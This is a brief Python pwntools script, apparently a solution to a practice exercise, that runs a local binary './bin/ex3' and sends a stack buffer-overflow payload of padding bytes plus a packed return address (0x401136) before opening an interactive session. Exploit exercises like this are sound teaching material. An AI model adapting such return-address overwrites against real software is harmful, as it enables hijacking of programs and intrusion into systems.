from pwn import *

target = process("./bin/ex3")

payload = b"a" * (32 + 8 + 8 + 8) + p64(0x401136)

target.send(payload)

target.interactive()
